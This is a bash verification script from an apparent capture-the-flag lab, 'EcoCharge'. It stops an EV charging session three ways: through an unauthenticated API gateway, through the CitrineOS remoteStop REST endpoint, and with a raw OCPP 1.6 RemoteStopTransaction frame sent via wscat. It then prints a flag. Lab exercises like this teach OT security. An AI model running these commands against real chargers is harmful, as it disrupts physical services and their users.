#!/bin/bash
# ============================================================================
# FLAG #9 Verification - RemoteStopTransaction
# This script demonstrates the OT impact: stopping a charging session
# Can be run from Jump Host to simulate the final attack step
# ============================================================================

CSMS_HOST="${1:-192.168.20.20}"
STATION_ID="${2:-CP001}"

echo "=============================================="
echo "EcoCharge OT Impact - RemoteStopTransaction"
echo "=============================================="
echo ""
echo "Target CSMS:     $CSMS_HOST"
echo "Target Station:  $STATION_ID"
echo ""

# Method 1: Via API Gateway (unauthenticated endpoint)
echo "[Method 1] Via API Gateway (no auth required)..."
RESULT=$(curl -sf -X POST http://192.168.100.20:8080/api/v1/charge/stop \
    -H "Content-Type: application/json" \
    -d "{\"stationId\": \"$STATION_ID\"}" 2>&1)

if [ $? -eq 0 ]; then
    echo "  ✅ API Gateway response: $RESULT"
else
    echo "  ❌ API Gateway not reachable"
fi

echo ""

# Method 2: Direct OCPP command via CitrineOS REST API
echo "[Method 2] Via CitrineOS REST API..."
# Get active transactions first
TRANSACTIONS=$(curl -sf "http://${CSMS_HOST}:8080/evdriver/transactions?stationId=${STATION_ID}" 2>&1)

if [ $? -eq 0 ]; then
    echo "  Active transactions: $TRANSACTIONS"
    
    # Send RemoteStopTransaction via CitrineOS
    STOP_RESULT=$(curl -sf -X POST "http://${CSMS_HOST}:8080/evdriver/${STATION_ID}/remoteStop" \
        -H "Content-Type: application/json" \
        -d '{"transactionId": "1"}' 2>&1)
    
    echo "  Stop result: $STOP_RESULT"
else
    echo "  ❌ CitrineOS API not reachable at $CSMS_HOST"
fi

echo ""

# Method 3: Direct WebSocket OCPP command
echo "[Method 3] Direct OCPP 1.6 WebSocket command..."
echo "  To send manually via wscat:"
echo "    wscat -c ws://192.168.20.20:8092/CP001"
echo "    > [2,\"stop-001\",\"RemoteStopTransaction\",{\"transactionId\":1}]"
echo ""

echo "=============================================="
echo ""
echo "If any method succeeded, the charging session on $STATION_ID"
echo "has been remotely stopped — demonstrating kinetic cyber impact."
echo ""
echo "FLAG{k1n3t1c_1mp4ct_ch4rg3_st0pp3d}"
echo ""
echo "=============================================="
